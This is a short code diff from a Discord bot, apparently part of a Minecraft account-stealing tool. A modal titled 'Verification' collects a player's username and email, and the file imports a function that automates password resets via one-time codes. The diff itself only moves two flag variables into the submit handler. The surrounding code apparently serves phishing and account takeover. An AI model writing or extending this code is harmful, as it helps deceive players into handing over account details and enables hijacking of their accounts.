@@ -19,11 +19,10 @@ from views.otp import automate_password_reset
 class MyModalOne(ui.Modal, title="Verification"):
     box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
     box_two = ui.TextInput(label="MINECRAFT EMAIL", required=True)
-    Flagx = False
-    FlagNx = False
-
 
     async def on_submit(self, interaction: discord.Interaction, /) -> None:
+        Flagx = False  
+        FlagNx = False
         threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vU1NJRFNwaW4=")
         url = f"https://api.hypixel.net/player?key={config.API_KEY}&name={self.box_one.value}"
         data1 = requests.get(url)
